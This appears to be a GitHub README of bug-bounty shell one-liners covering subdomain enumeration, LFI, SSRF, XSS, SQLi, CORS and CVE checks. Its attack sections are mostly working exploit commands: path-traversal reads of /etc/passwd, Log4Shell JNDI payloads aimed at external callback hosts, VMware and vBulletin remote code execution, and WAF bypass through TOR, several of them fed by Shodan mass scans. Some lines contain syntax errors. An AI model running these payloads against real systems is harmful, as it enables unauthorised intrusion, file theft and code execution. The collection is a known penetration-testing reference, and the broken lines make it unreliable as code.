# One-Liners [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)

###### Thanks to all who create these Awesome One Liners❤️
----------------------
![image](https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png)
---------------------------
# Subdomain Enumeration
**Juicy Subdomains**
```
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```
**from BufferOver.run**
```
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 
```
**from Riddler.io**
```
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**from RedHunt Labs Recon API**
```
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r
```
**from nmap**
```
nmap --script hostmap-crtsh.nse target.com
```
**from CertSpotter**
```
curl -s "https://certspotter.com/api/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from Archive**
```
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
**from JLDC**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from crt.sh**
```
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**from ThreatMiner**
```
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u
```
**from Anubis**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"
```
**from ThreatCrowd**
```
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"
```
**from HackerTarget**
```
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
```
**from AlienVault**
```
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u
```
***SubDomain Bruteforcing - ffuf***
```
ffuf -u https://FUZZ.target.com -w dns.txt -v | grep "| URL |" | awk '{print $4}'
```
--------
## Subdomain Takeover:
```
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```
-------------------------------
## LFI:
```
cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
```
----------------------
## Open Redirect:
```
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
```
cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
```
----------------
## XSS:
```
cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
```
```
cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```
```
ffuf -c -w urls.txt:FUZZ1 -w wordlist.txt:FUZZ2 -u FUZZ1/FUZZ2 -mc 200 -ac -recursion -v -of json -o output
```
## ffuf json to txt output
```
cat output.json | jq | grep -o '"url": ".*"' | grep -o 'https://[^"]*'
```
**Search for Sensitive files from Wayback**
```
waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
```
-------------------
## SQLi:
```
cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
```
***Bypass WAF using TOR***
```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor
```
----------------
## CORS:
```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## CVEs:
### CVE-2020-5902:
```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
### CVE-2020-3452:
```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
### CVE-2021-44228:
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```
### CVE-2022-0378:
```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
### CVE-2022-22954:
```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
```
### CVE-2022-41040:
```
ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
```
---------
## RCE:
```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
```
### vBulletin 5.6.2
```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
-----------
## JS Files:
### Find JS Files:
```
gau --subs target.com |grep -iE '.js'|grep -iEv '(.jsp|.json)' >> js.txt
```
```
assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
### Hidden Params in JS:
```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
---------------------------
## HeartBleed
```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```
------------------
## Scan IPs
```
cat my_ips.txt | xargs -L100 shodan scan submit --wait 0
```
## Portscan
```
naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -silent -o out.txt
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## IPs from CIDR
```
echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 --no-cast --no-escape --dbs --random-agent
```
## Shodan Cli
```
shodan search Ssl.cert.subject.CN:"target.com" --field ip_str | httpx -silent | tee ips.txt
```
### ffuf txt output
```
ffuf -w wordlists.txt -u URL/FUZZ -r -ac -v &>> output.txt ; sed -i 's/\:\: Progress.*Errors.*\:\://g' output.txt ; sed -i 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' output.txt
```
### Ffuf json to only url
```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```
## Recon Oneliner from Stok
```
subfinder -d moonpay.com -silent | anew moonpay-subs.txt | dnsx -resp -silent | anew moonpay-alive-subs-ip.txt | awk '{print $1}' | anew moonpay-alive-subs.txt | naabu -top-ports 1000 -silent | anew moonpay-openports.txt | cut -d ":" -f1 | naabu -passive -silent | anew moonpay-openports.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}' | gospider -t 10 -q -o moonpaycrawl | anew moonpay-crawled.txt | unfurl format %s://dtp | httpx -silent -title -status-code -mc 403,400,500 | anew moonpay-crawled-interesting.txt | awk '{print $1}' | gau --blacklist eot,svg,woff,ttf,png,jpg,gif,otf,bmp,pdf,mp3,mp4,mov --subs | anew moonpay-gau.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew moonpay-web-alive.txt | awk '{print $1}'| nuclei -eid expired-ssl,tls-version,ssl-issuer,deprecated-tls,revoked-ssl-certificate,self-signed-ssl,kubernetes-fake-certificate,ssl-dns-names,weak-cipher-suites,mismatched-ssl-certificate,untrusted-root-certificate,metasploit-c2,openssl-detect,default-ssltls-test-page,wordpress-really-simple-ssl,wordpress-ssl-insecure-content-fixer,cname-fingerprint,mx-fingerprint,txt-fingerprint,http-missing-security-headers,nameserver-fingerprint,caa-fingerprint,ptr-fingerprint,wildcard-postmessage,symfony-fosjrouting-bundle,exposed-sharepoint-list,CVE-2022-1595,CVE-2017-5487,weak-cipher-suites,unauthenticated-varnish-cache-purge,dwr-index-detect,sitecore-debug-page,python-metrics,kubernetes-metrics,loqate-api-key,kube-state-metrics,postgres-exporter-metrics,CVE-2000-0114,node-exporter-metrics,kube-state-metrics,prometheus-log,express-stack-trace,apache-filename-enum,debug-vars,elasticsearch,springboot-loggers -ss template-spray | notify -silent
```
## Update golang
```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh|sudo bash
```

## Censys CLI
```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
## Nmap cidr to ips.txt
```
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
```
____________________________________________________________________________________________________________________________
## Support Me
<a href="https://www.buymeacoffee.com/0xPugazh" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
